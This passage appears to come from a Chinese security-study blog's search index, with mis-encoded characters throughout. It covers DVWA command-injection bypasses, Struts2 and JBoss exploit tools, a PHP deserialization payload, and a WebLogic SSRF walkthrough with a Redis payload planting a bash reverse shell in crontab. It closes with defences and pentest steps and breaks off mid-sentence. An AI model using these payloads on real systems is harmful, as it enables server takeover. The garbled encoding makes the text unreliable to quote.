è¢«å¤„ç†ï¼Œå¯ä»¥åœ¨æ‰§è¡Œ exec() ä¹‹å‰å‘¼å« unset()ã€‚è‹¥æ˜¯ return_var è·Ÿ array äºŒä¸ªå‚æ•°éƒ½å­˜åœ¨ï¼Œåˆ™æ‰§è¡Œ command ä¹‹åçš„çŠ¶æ€ä¼šå¡«å…¥ return_var ä¸­ã€‚ å€¼å¾—æ³¨æ„çš„æ˜¯è‹¥éœ€è¦å¤„ç†ä½¿ç”¨è€…è¾“å…¥çš„èµ„æ–™ï¼Œè€Œåˆè¦é˜²æ­¢ä½¿ç”¨è€…è€èŠ±æ‹›ç ´è§£ç³»ç»Ÿï¼Œåˆ™å¯ä»¥ä½¿ç”¨EscapeShellCmd() popenå‡½æ•° è¯´æ˜ï¼šæ‰“å¼€æ–‡ä»¶ã€‚ è¯­æ³•ï¼šint popen(string command, string mode); è¿”å›å€¼: æ•´æ•° è¯¦ç»†ä»‹ç»ï¼šæœ¬å‡½æ•°æ‰§è¡ŒæŒ‡ä»¤å¼€æ¡£ï¼Œè€Œè¯¥æ–‡ä»¶æ˜¯ç”¨ç®¡é“æ–¹å¼å¤„ç†çš„æ–‡ä»¶ã€‚ç”¨æœ¬å‡½æ•°æ‰“å¼€çš„æ–‡ä»¶åªèƒ½æ˜¯å•å‘çš„(åªèƒ½è¯»æˆ–åªèƒ½å†™)ï¼Œè€Œä¸”ä¸€å®šè¦ç”¨pclose() å…³é—­ã€‚åœ¨æ–‡ä»¶æ“ä½œä¸Šå¯ä½¿ç”¨ fgets()ã€fgetss() ä¸ fputs()ã€‚è‹¥æ˜¯å¼€æ¡£å‘ç”Ÿé”™è¯¯ï¼Œè¿”å› false å€¼ã€‚ åæ’‡å·`ï¼ˆå’Œ~åœ¨åŒä¸€ä¸ªé”®ï¼‰æ‰§è¡Œç³»ç»Ÿå¤–éƒ¨å‘½ä»¤, ä»£ç å¦‚ä¸‹:echo dir; çŸ¥è¯†ç‚¹ï¼šåœ¨ä½¿ç”¨è¿™ç§æ–¹æ³•æ‰§è¡Œç³»ç»Ÿå¤–éƒ¨å‘½ä»¤æ—¶ï¼Œä½ è¦ç¡®ä¿shell_execå‡½æ•°å¯ç”¨ï¼Œå¦åˆ™æ˜¯æ— æ³•ä½¿ç”¨è¿™ç§åæ’‡å·æ‰§è¡Œç³»ç»Ÿå¤–éƒ¨å‘½ä»¤çš„ã€‚ å®‰å…¨æ€§è¯´æ˜:å½“ä½ ä½¿ç”¨è¿™äº›å‡½æ•°æ‰§è¡Œå‘½ä»¤æ—¶ï¼Œå¦‚æœæ˜¯æ ¹æ®ç”¨æˆ·æäº¤æ•°æ®ä½œä¸ºæ‰§è¡Œå‘½ä»¤çš„è¯ï¼Œä½ éœ€è¦è€ƒè™‘ç³»ç»Ÿå®‰å…¨æ€§ï¼Œå¯ä»¥ä½¿ç”¨escapeshellcmd()å’Œescapeshellarg()å‡½æ•°é˜»æ­¢ç”¨æˆ·æ¶æ„åœ¨ç³»ç»Ÿä¸Šæ‰§è¡Œå‘½ä»¤ï¼Œescapeshellcmd()é’ˆå¯¹çš„æ˜¯æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤ï¼Œè€Œescapeshellarg()é’ˆå¯¹çš„æ˜¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‚æ•°ã€‚è¿™ä¸¤ä¸ªå‚æ•°æœ‰ç‚¹ç±»ä¼¼addslashes()çš„åŠŸèƒ½ã€‚ å®Œæˆdvwaä¸‰ä¸ªçº§åˆ«å®éªŒLowçº§åˆ« å½“dvwaçº§åˆ«ä¸ºlowæ—¶å¯ä»¥çœ‹æºä»£ç æ²¡åšè¿‡æ»¤ æˆ‘ä»¬ä¾¿å¯ä»¥é€šè¿‡åŠ &amp;&amp;ã€ï¼›ã€|ã€ç­‰ç¬¦å·å…¥ä¾µï¼ˆå½“æœ‰&amp;&amp;æ—¶å‰é¢ipå¿…é¡»ä¸ºçœŸâ€˜å¦åˆ™åé¢çš„å‘½ä»¤ä¸ä¼šæ‰§è¡Œå½“è‡ªæœ‰&amp;æ—¶å‰é¢ipä¸ºå‡é‚£ä¹ˆå‘½ä»¤ä¾¿ä¼šåœ¨webå­˜åœ¨çš„æœåŠ¡å™¨æ‰§è¡Œï¼‰ æˆ‘ä»¬ä¾¿å¯ä»¥é€šè¿‡127.0.0.1&amp;&amp;ipconfigï¼ˆå„ç§å‘½ä»¤ï¼‰æ¥æ‰§è¡Œå‘½ä»¤ Mediumçº§åˆ« å½“åœ¨mediumçº§åˆ«æ—¶æˆ‘ä»¬å¯ä»¥çœ‹æºä»£ç å°†&amp;&amp;ã€ï¼›ã€è¿‡æ»¤äº† è¿™æ—¶æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ·»åŠ &amp;åŠ ç©ºæ ¼æˆ–&amp;;&amp; è¿›è¡Œå…¥ä¾µ Highçº§åˆ« åœ¨highçº§åˆ«æ—¶æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æºä»£ç å¯¹ä»¥ä¸‹åšäº†è¿‡æ»¤ æ­¤æ—¶æˆ‘ä»¬å¯ä»¥æ·»åŠ || ï¼ˆä»£ç é‡Œé¢çš„|åæœ‰ä¸€ä¸ªç©ºæ ¼ï¼‰è¿›è¡Œå…¥ä¾µ Impossibleçº§åˆ«çš„ä»£ç åŠ å…¥äº†Anti-CSRF tokenï¼ŒåŒæ—¶å¯¹å‚æ•°ipè¿›è¡Œäº†ä¸¥æ ¼çš„é™åˆ¶ï¼Œåªæœ‰è¯¸å¦‚â€œæ•°å­—.æ•°å­—.æ•°å­—.æ•°å­—â€çš„è¾“å…¥æ‰ä¼šè¢«æ¥æ”¶æ‰§è¡Œï¼Œå› æ­¤ä¸å­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼æ´ã€‚ struts2 048ã€045ã€052ã€057å®éªŒå‚è€ƒæ–‡ç« ï¼š https://blog.csdn.net/weixin_43625577/article/details/97111575 https://www.sinesafe.com/article/20180823/struts2057.html Struts2 045å®éªŒä½¿ç”¨k8å·¥å…· æ‰§è¡Œæ·»åŠ è´¦å·å‘½ä»¤ ä¸Šä¼ æœ¨é©¬å°é©¬ é“¾æ¥å°é©¬ä¸Šä¼ å¤§é©¬ Struts2 048å®éªŒä½¿ç”¨æ–¹æ³•struts2_S2-048.py Struts2 052å®éªŒå‚è€ƒhttps://www.cnblogs.com/Hi-blog/p/7510987.html é’ˆå¯¹ç‰ˆæœ¬Ubuntu 16.04 ã€Apache/2.4.18ã€Struts2.5 â€“ Struts2.5.12ç‰ˆæœ¬ã€‚ï¼šstruts2-rest-showcaseå› ä¸ºæˆ‘çš„ç‰ˆæœ¬æ— æ¼æ´å°±å…ˆæŠŠæ“ä½œè¿‡ç¨‹å¦‚ä¸‹ ååºåˆ—åŒ–å°±æ˜¯æŠŠä¸€ä¸ªå¯¹è±¡å˜æˆå¯ä»¥ä¼ è¾“çš„å­—ç¬¦ä¸²ï¼Œç›®çš„å°±æ˜¯ä¸ºäº†æ–¹ä¾¿ä¼ è¾“ã€‚å‡è®¾ï¼Œæˆ‘ä»¬å†™äº†ä¸€ä¸ªclassï¼Œè¿™ä¸ªclassé‡Œé¢å­˜æœ‰ä¸€äº›å˜é‡ã€‚å½“è¿™ä¸ªclassè¢«å®ä¾‹åŒ–äº†ä¹‹åï¼Œåœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­é‡Œé¢çš„ä¸€äº›å˜é‡å€¼å‘ç”Ÿäº†æ”¹å˜ã€‚ä»¥ååœ¨æŸäº›æ—¶å€™è¿˜ä¼šç”¨åˆ°è¿™ä¸ªå˜é‡ï¼Œå¦‚æœæˆ‘ä»¬è®©è¿™ä¸ªclassä¸€ç›´ä¸é”€æ¯ï¼Œç­‰ç€ä¸‹ä¸€æ¬¡è¦ç”¨å®ƒçš„æ—¶å€™å†ä¸€æ¬¡è¢«è°ƒç”¨çš„è¯ï¼Œæµªè´¹ç³»ç»Ÿèµ„æºã€‚å½“æˆ‘ä»¬å†™ä¸€ä¸ªå°å‹çš„é¡¹ç›®å¯èƒ½æ²¡æœ‰å¤ªå¤§çš„å½±å“ï¼Œä½†æ˜¯éšç€é¡¹ç›®çš„å£®å¤§ï¼Œä¸€äº›å°é—®é¢˜è¢«æ”¾å¤§äº†ä¹‹åå°±ä¼šäº§ç”Ÿå¾ˆå¤šéº»çƒ¦ã€‚è¿™ä¸ªæ—¶å€™PHPå°±å’Œæˆ‘ä»¬è¯´ï¼Œä½ å¯ä»¥æŠŠè¿™ä¸ªå¯¹è±¡åºåˆ—åŒ–äº†ï¼Œå­˜æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå½“ä½ è¦ç”¨çš„æ—¶å€™å†æ”¾ä»–å‡ºæ¥å°±å¥½äº†ã€‚åœ¨æˆ‘ä»¬è®²PHPååºåˆ—åŒ–çš„æ—¶å€™ï¼ŒåŸºæœ¬éƒ½æ˜¯å›´ç»•ç€serialize()ï¼Œunserialize()è¿™ä¸¤ä¸ªå‡½æ•°ã€‚ è¯¦ç»†å‚è€ƒï¼š https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/ åŸç†serialize()å’Œ unserialize() åœ¨ PHPå†…éƒ¨å®ç°ä¸Šæ˜¯æ²¡æœ‰æ¼æ´çš„ï¼Œä¹‹æ‰€ä»¥ä¼šäº§ç”Ÿååºåˆ—åŒ–æ¼æ´æ˜¯å› ä¸ºåº”ç”¨ç¨‹åºåœ¨å¤„ç†å¯¹è±¡ã€é­”æœ¯å‡½æ•°ä»¥åŠåºåˆ—åŒ–ç›¸å…³é—®é¢˜çš„æ—¶å€™å¯¼è‡´çš„ã€‚ å½“ä¼ ç»™ unserialize() çš„å‚æ•°å¯æ§æ—¶ï¼Œé‚£ä¹ˆç”¨æˆ·å°±å¯ä»¥æ³¨å…¥ç²¾å¿ƒæ„é€ çš„ payloadã€‚å½“è¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™å°±æœ‰å¯èƒ½ä¼šè§¦å‘å¯¹è±¡ä¸­çš„ä¸€äº›é­”æœ¯æ–¹æ³•ï¼Œé€ æˆæ„æƒ³ä¸åˆ°çš„å±å®³ã€‚ â›µPHPååºåˆ—åŒ–å‡½æ•°ï¼šserialize()ï¼Œunserialize() â›µJavaååºåˆ—åŒ–å‡½æ•°ï¼šObjectOutputStreamçš„writeObject()å’ŒObjectInputStreamçš„readObject()ã€‚ â›µå¸¸è§çš„å‡ ä¸ªé­”æ³•å‡½æ•°ï¼šé­”æ³•å‡½æ•°å‰è¾¹éƒ½ä¼šæœ‰ __ __construct()å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨ __destruct()å½“ä¸€ä¸ªå¯¹è±¡é”€æ¯æ—¶è¢«è°ƒç”¨ __toString()å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨ __sleep() åœ¨å¯¹è±¡åœ¨è¢«åºåˆ—åŒ–ä¹‹å‰è¿è¡Œ __wakeupå°†åœ¨åºåˆ—åŒ–ä¹‹åç«‹å³è¢«è°ƒç”¨ å®Œæˆååºåˆ—åŒ–pikachuå®è¯•åœ¨çº¿ååºåˆ—åŒ–å·¥å…·ï¼šhttps://www.w3cschool.cn/tools/index?name=unserialize è¾“å…¥payloadï¼šO:1:â€Sâ€:1:{s:4:â€testâ€;s:29:â€alert(â€˜xssâ€™)â€;} å®Œæˆjbossååºåˆ—åŒ–åˆwebshellå†å²æ¼æ´å‚è€ƒ;https://www.seebug.org/appdir/JBoss https://www.jianshu.com/p/e34062e0a6f1 æ–°æ¼æ´åˆ©ç”¨å·¥å…·ä¸‹è½½ï¼šhttps://github.com/yunxu1/jboss-_CVE-2017-12149 è€æ¼æ´ç»¼åˆåˆ©ç”¨å·¥å…·ä¸‹è½½ï¼šhttps://download.csdn.net/download/sinat_26474359/10650591 æˆ‘ä»¬ä½¿ç”¨javaååºåˆ—åŒ–åˆ©ç”¨ç¨‹åºå·¥å…·ç›®æ ‡åœ°å€ç›´æ¥æ¥æ ¹ç›®å½•å°±è¡Œ å‘½ä»¤æ‰§è¡Œæ—¶ç”¨dir /s c:\\jboss\\index.jspè¿™ç§æ ¼å¼ jbossã€Weblogicã€redisé»˜è®¤ç«¯å£å·Jbossé»˜è®¤ç«¯å£å·8080 Weblogicé»˜è®¤ç«¯å£å·7001 Redisé»˜è®¤ç«¯å£å·6379 Weblogicååºåˆ—åŒ–ã€æ–‡ä»¶ä¸Šä¼ æ¼æ´å®éªŒï¼Œè®°ä½æ¼æ´ç¼–å·æ–‡ä»¶ä¸Šä¼ æ¼æ´å®éªŒ Weblogicååºåˆ—åŒ– ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´æ“ä½œï¼ˆCVE-2018-2894ï¼‰Weblogic ssrfæ¼æ´åˆ©ç”¨è¿‡ç¨‹å‚è€ƒï¼šhttps://www.jianshu.com/p/97b157a20108 https://www.cnblogs.com/bmjoker/p/9759761.html 1ã€æ£€æµ‹æ¼æ´:ç›´æ¥è®¿é—®ï¼šhttp://ip:7001/uddiexplorer/, SSRFæ¼æ´å­˜åœ¨äºhttp://ip:7001/uddiexplorer/SearchPublicRegistries.jsp 2ã€å‘æœåŠ¡å™¨æäº¤ä»¥ä¸‹å‚æ•° rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001 å…³é”®ç‚¹æ˜¯operatorè¿™ä¸ªå‚æ•°ï¼Œè®¿é—®7001ç«¯å£æ—¶è¿”å›ä¸€ä¸ª404çš„çŠ¶æ€ç ã€‚ 3ã€è®¿é—®ä¸€ä¸ªä¸å­˜åœ¨çš„ç«¯å£ä¼šè¿”å›ä»¥ä¸‹ä¿¡æ¯ã€‚ å¯ä»¥é€šè¿‡è¿”å›çš„ä¿¡æ¯ä¸åŒï¼Œæ¥åˆ¤æ–­ç«¯å£å¼€æ”¾çš„çŠ¶æ€ã€‚ ç»è¿‡æ¢æµ‹ï¼Œæˆ‘ä»¬å‘ç°äº†å†…ç½‘çš„ä¸€ä¸ªIPå­˜åœ¨6379ç«¯å£ï¼Œä¹Ÿå°±æ˜¯redisæœåŠ¡ï¼š æˆ‘ä»¬è¿™é‡Œè¦å‘é€å‡ è¡Œä»£ç  å‘é€ä¸‰æ¡rediså‘½ä»¤ï¼Œå°†å¼¹shellè„šæœ¬å†™å…¥/etc/crontabï¼š æŠŠè¿™ä¸‰æ¡å‘½ä»¤é€šè¿‡getåŒ…æ³¨å…¥è¿›å»ï¼Œå…ˆè¦å°†å‘½ä»¤ç”¨urlè¿›è¡Œç¼–ç  æ³¨æ„ï¼Œæ¢è¡Œç¬¦æ˜¯â€œ\\r\\nâ€ï¼Œä¹Ÿå°±æ˜¯â€œ%0D%0Aâ€ test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.19.0.1%2F21%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa ç„¶åæˆ‘ä»¬æŠŠæ„é€ å¥½çš„æ•°æ®åŒ…é€šè¿‡burpè¿›è¡Œå‘é€ , å°†urlç¼–ç åçš„å­—ç¬¦ä¸²æ”¾åœ¨ssrfçš„åŸŸååé¢ï¼Œå‘é€ï¼š æ¥ç€é¶æœºä¸Šå¼€å¯ç«¯å£ç›‘å¬ï¼Œnc-lvnp 21 ,åå¼¹shellã€‚æˆåŠŸã€‚ ååºåˆ—åŒ–åŠå‘½ä»¤æ‰§è¡Œé˜²èŒƒæ–¹æ³•ğŸš¢ååºåˆ—åŒ–æ¼æ´é˜²å¾¡ï¼š1ã€ç±»çš„ç™½åå•æ ¡éªŒæœºåˆ¶ï¼š å®é™…ä¸ŠåŸç†å¾ˆç®€å•ï¼Œå°±æ˜¯å¯¹æ‰€æœ‰ä¼ å…¥çš„ååºåˆ—åŒ–å¯¹è±¡ï¼Œåœ¨ååºåˆ—åŒ–è¿‡ç¨‹å¼€å§‹å‰ï¼Œå¯¹ç±»å‹åç§°åšä¸€ä¸ªæ£€æŸ¥ï¼Œä¸ç¬¦åˆç™½åå•çš„ç±»ä¸è¿›è¡Œååºåˆ—åŒ–æ“ä½œã€‚å¾ˆæ˜¾ç„¶ï¼Œè¿™ä¸ªç™½åå•è‚¯å®šæ˜¯ä¸å­˜åœ¨Runtimeçš„ã€‚ 2ã€ ç¦æ­¢JVMæ‰§è¡Œå¤–éƒ¨å‘½ä»¤Runtime.exec è¿™ä¸ªæªæ–½å¯ä»¥é€šè¿‡æ‰©å±• SecurityManager å¯ä»¥å®ç°ã€‚ PHPé˜²å¾¡1ã€å®‰å…¨é…ç½®å¥½phpç›¸å…³å‚æ•°ï¼šé€šè¿‡Phpé…ç½®æ–‡ä»¶é‡Œé¢æœ‰ä¸ªdisable_functions = é…ç½®ï¼Œè¿™ä¸ªç¦æ­¢æŸäº›phpå‡½æ•°ï¼Œ æœåŠ¡å™¨ä¾¿æ˜¯ç”¨è¿™ä¸ªæ¥ç¦æ­¢phpçš„æ‰§è¡Œå‘½ä»¤å‡½æ•°ã€‚ ğŸª‚ä¾‹å¦‚ï¼šdisable_functions=system,passthru,shell_exec,exec,popen ä¾¿ç¦æ­¢äº†ç”¨è¿™äº›å‡½æ•°æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚ 2ã€å‡çº§ä¸­é—´ä»¶ 3ã€ä¸¥æ ¼æ§åˆ¶ä¼ å…¥å˜é‡ï¼Œä¸¥è°¨ä½¿ç”¨é­”æ³•å‡½æ•° weblogicé˜²å¾¡1ã€è¿‡æ»¤T3åè®®ï¼Œé™å®šå¯è¿æ¥çš„IP 2ã€è®¾ç½®Nginxåå‘ä»£ç†ï¼Œå®ç°t3åè®®å’Œhttpåè®®éš”ç¦» 3ã€JEP290ï¼ˆJDK8u121ï¼Œ7u131ï¼Œ6u141ï¼‰ï¼Œè¿™ä¸ªæœºåˆ¶ä¸»è¦æ˜¯åœ¨æ¯å±‚ååºåˆ—åŒ–è¿‡ç¨‹ä¸­éƒ½åŠ äº†ä¸€å±‚é»‘åå•å¤„ç† åŸç”Ÿååºåˆ—åŒ–é˜²å¾¡1ã€ä¸è¦ååºåˆ—åŒ–ä¸å¯ä¿¡çš„æ•°æ® 2ã€ ç»™ååºåˆ—æ•°æ®åŠ å¯†ç­¾åï¼Œå¹¶ç¡®ä¿è§£å¯†åœ¨ååºåˆ—ä¹‹å‰ 3ã€ç»™ååºåˆ—åŒ–æ¥å£æ·»åŠ è®¤è¯æˆæƒ 4ã€ ååºåˆ—åŒ–æœåŠ¡åªå…è®¸ç›‘å¬åœ¨æœ¬åœ°æˆ–è€…å¼€å¯ç›¸åº”é˜²ç«å¢™ 5ã€ å‡çº§ç¬¬ä¸‰æ–¹åº“ 6ã€å‡çº§JDKï¼ŒJEP290","categories":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://zhangyanlady.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"keywords":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"è¶Šæƒã€é€»è¾‘æ¼æ´","slug":"è¶Šæƒã€é€»è¾‘æ¼æ´","date":"2019-12-20T12:07:08.000Z","updated":"2020-09-20T09:00:06.626Z","comments":true,"path":"2019/12/20/è¶Šæƒã€é€»è¾‘æ¼æ´/","link":"","permalink":"https://zhangyanlady.github.io/2019/12/20/%E8%B6%8A%E6%9D%83%E3%80%81%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"æ€»ç»“å›¾","categories":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://zhangyanlady.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"keywords":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"æ¸—é€æ­¥éª¤","slug":"æ¸—é€æ­¥éª¤","date":"2019-12-20T11:30:24.000Z","updated":"2020-09-20T08:57:50.658Z","comments":true,"path":"2019/12/20/æ¸—é€æ­¥éª¤/","link":"","permalink":"https://zhangyanlady.github.io/2019/12/20/%E6%B8%97%E9%80%8F%E6%AD%A5%E9%AA%A4/","excerpt":"","text":"æ¸—é€æµ‹è¯•æ­¥éª¤ï¼šæ¸—é€æµ‹è¯•ä¸å…¥ä¾µçš„æœ€å¤§åŒºåˆ« æ¸—é€æµ‹è¯•ï¼šå‡ºäºä¿æŠ¤ç³»ç»Ÿçš„ç›®çš„ï¼Œæ›´å…¨é¢åœ°æ‰¾å‡ºæµ‹è¯•å¯¹è±¡çš„å®‰å…¨éšæ‚£ã€‚ å…¥ä¾µï¼šä¸æ‹©æ‰‹æ®µåœ°ï¼ˆç”šè‡³æ˜¯å…·æœ‰ç ´åæ€§çš„ï¼‰æ‹¿åˆ°ç³»ç»Ÿæƒé™ã€‚ ä¸€èˆ¬æ¸—é€æµ‹è¯•æµç¨‹ æµç¨‹å¹¶éä¸‡èƒ½ï¼Œåªæ˜¯ä¸€ä¸ªå·¥å…·ã€‚æ€è€ƒä¸æµç¨‹å¹¶ç”¨ï¼Œç»“åˆè‡ªå·±ç»éªŒã€‚ 2.1 æ˜ç¡®ç›®æ ‡ ç¡®å®šèŒƒå›´ï¼šæµ‹è¯•ç›®æ ‡çš„èŒƒå›´ï¼Œipï¼ŒåŸŸåï¼Œå†…å¤–ç½‘ ç¡®å®šè§„åˆ™ï¼šèƒ½æ¸—é€åˆ°ä»€ä¹ˆç¨‹åº¦ï¼Œæ—¶é—´ï¼Ÿèƒ½å¦ä¿®æ”¹ä¸Šä¼ ï¼Ÿèƒ½å¦ææƒç­‰ã€‚ ç¡®å®šéœ€æ±‚ï¼šwebåº”ç”¨çš„æ¼æ´(æ–°ä¸Šçº¿ç¨‹åº)ï¼Ÿä¸šåŠ¡é€»è¾‘æ¼æ´ï¼ˆé’ˆå¯¹ä¸šåŠ¡çš„ï¼‰ï¼Ÿäººå‘˜æƒé™ç®¡ç†æ¼æ´ï¼ˆé’ˆå¯¹äººå‘˜ã€æƒé™ï¼‰ï¼Ÿç­‰ç­‰ã€‚ï¼ˆç«‹ä½“å…¨æ–¹ä½ï¼‰ æ ¹æ®éœ€æ±‚å’Œè‡ªå·±æŠ€æœ¯èƒ½åŠ›æ¥ç¡®å®šèƒ½ä¸èƒ½åšï¼Œèƒ½åšå¤šå°‘ã€‚ 2.2 ä¿¡æ¯æ”¶é›† æ–¹å¼ï¼šä¸»åŠ¨æ‰«æï¼Œå¼€æ”¾æœç´¢ç­‰ å¼€æ”¾æœç´¢ï¼šåˆ©ç”¨æœç´¢å¼•æ“è·å¾—ï¼Œåå°ï¼Œæœªæˆæƒé¡µé¢ï¼Œæ•æ„Ÿurlç­‰ã€‚ åŸºç¡€ä¿¡æ¯ï¼šIPï¼Œç½‘æ®µï¼ŒåŸŸåï¼Œç«¯å£ ç³»ç»Ÿä¿¡æ¯ï¼šæ“ä½œç³»ç»Ÿç‰ˆæœ¬ åº”ç”¨ä¿¡æ¯ï¼šå„ç«¯å£çš„åº”ç”¨ï¼Œä¾‹å¦‚webåº”ç”¨ï¼Œé‚®ä»¶åº”ç”¨ç­‰ç­‰ ç‰ˆæœ¬ä¿¡æ¯ï¼šæ‰€æœ‰è¿™äº›æ¢æµ‹åˆ°çš„ä¸œè¥¿çš„ç‰ˆæœ¬ã€‚ æœåŠ¡ä¿¡æ¯ äººå‘˜ä¿¡æ¯ï¼šåŸŸåæ³¨å†Œäººå‘˜ä¿¡æ¯ï¼Œwebåº”ç”¨ä¸­ç½‘ç«™å‘å¸–äººçš„idï¼Œç®¡ç†å‘˜å§“åç­‰ã€‚ é˜²æŠ¤ä¿¡æ¯ï¼šè¯•ç€çœ‹èƒ½å¦æ¢æµ‹åˆ°é˜²æŠ¤è®¾å¤‡ 2.3 æ¼æ´æ¢ç´¢ åˆ©ç”¨ä¸Šä¸€æ­¥ä¸­åˆ—å‡ºçš„å„ç§ç³»ç»Ÿï¼Œåº”ç”¨ç­‰ä½¿ç”¨ç›¸åº”çš„æ¼æ´ã€‚ æ–¹æ³•ï¼š 1.æ¼æ‰«ï¼Œawvsï¼ŒIBM appscanç­‰ã€‚ 2.ç»“åˆæ¼æ´å»exploit-dbç­‰ä½ç½®æ‰¾åˆ©ç”¨ã€‚ 3.åœ¨ç½‘ä¸Šå¯»æ‰¾éªŒè¯pocã€‚ å†…å®¹ï¼š ç³»ç»Ÿæ¼æ´ï¼šç³»ç»Ÿæ²¡æœ‰åŠæ—¶æ‰“è¡¥ä¸ Webseveræ¼æ´ï¼šWebseveré…ç½®é—®é¢˜ Webåº”ç”¨æ¼æ´ï¼šWebåº”ç”¨å¼€å‘é—®é¢˜ å…¶å®ƒç«¯å£æœåŠ¡æ¼æ´ï¼šå„ç§21/8080(st2)/7001/22/3389 é€šä¿¡å®‰å…¨ï¼šæ˜æ–‡ä¼ è¾“ï¼Œtokenåœ¨cookieä¸­ä¼ é€ç­‰ã€‚ 2.4 æ¼æ´éªŒè¯ å°†ä¸Šä¸€æ­¥ä¸­å‘ç°çš„æœ‰å¯èƒ½å¯ä»¥æˆåŠŸåˆ©ç”¨çš„å…¨éƒ¨æ¼æ´éƒ½éªŒè¯ä¸€éã€‚ç»“åˆå®é™…æƒ…å†µï¼Œæ­å»ºæ¨¡æ‹Ÿç¯å¢ƒè¿›è¡Œè¯•éªŒã€‚æˆåŠŸåå†åº”ç”¨äºç›®æ ‡ä¸­ã€‚ è‡ªåŠ¨åŒ–éªŒè¯ï¼šç»“åˆè‡ªåŠ¨åŒ–æ‰«æå·¥å…·æä¾›çš„ç»“æœ æ‰‹å·¥éªŒè¯ï¼Œæ ¹æ®å…¬å¼€èµ„æºè¿›è¡ŒéªŒè¯ è¯•éªŒéªŒè¯ï¼šè‡ªå·±æ­å»ºæ¨¡æ‹Ÿç¯å¢ƒè¿›è¡ŒéªŒè¯ ç™»é™†çŒœè§£ï¼šæœ‰æ—¶å¯ä»¥å°è¯•çŒœè§£ä¸€ä¸‹ç™»é™†å£çš„è´¦å·å¯†ç ç­‰ä¿¡æ¯ ä¸šåŠ¡æ¼æ´éªŒè¯ï¼šå¦‚å‘ç°ä¸šåŠ¡æ¼æ´ï¼Œè¦è¿›è¡ŒéªŒè¯ å…¬å¼€èµ„æºçš„åˆ©ç”¨ -exploit-db/wooyun/ -google hacking -æ¸—é€ä»£ç ç½‘ç«™ -é€šç”¨ã€ç¼ºçœå£ä»¤ -å‚å•†çš„æ¼æ´è­¦å‘Šç­‰ç­‰ã€‚ 2.5 ä¿¡æ¯åˆ†æ ä¸ºä¸‹ä¸€æ­¥å®æ–½æ¸—é€åšå‡†å¤‡ã€‚ ç²¾å‡†æ‰“å‡»ï¼šå‡†å¤‡å¥½ä¸Šä¸€æ­¥æ¢æµ‹åˆ°çš„æ¼æ´çš„expï¼Œç”¨æ¥ç²¾å‡†æ‰“å‡» ç»•è¿‡é˜²å¾¡æœºåˆ¶ï¼šæ˜¯å¦æœ‰é˜²ç«å¢™ç­‰è®¾å¤‡ï¼Œå¦‚ä½•ç»•è¿‡ å®šåˆ¶æ”»å‡»è·¯å¾„ï¼šæœ€ä½³å·¥å…·è·¯å¾„ï¼Œæ ¹æ®è–„å¼±å…¥å£ï¼Œé«˜å†…ç½‘æƒé™ä½ç½®ï¼Œæœ€ç»ˆç›®æ ‡ ç»•è¿‡æ£€æµ‹æœºåˆ¶ï¼šæ˜¯å¦æœ‰æ£€æµ‹æœºåˆ¶ï¼Œæµé‡ç›‘æ§ï¼Œæ€æ¯’è½¯ä»¶ï¼Œæ¶æ„ä»£ç æ£€æµ‹ç­‰ï¼ˆå…æ€ï¼‰ æ”»å‡»ä»£ç ï¼šç»è¿‡è¯•éªŒå¾—æ¥çš„ä»£ç ï¼ŒåŒ…æ‹¬ä¸é™äºxssä»£ç ï¼Œsqlæ³¨å…¥è¯­å¥ç­‰ 2.6 è·å–æ‰€éœ€ å®æ–½æ”»å‡»ï¼šæ 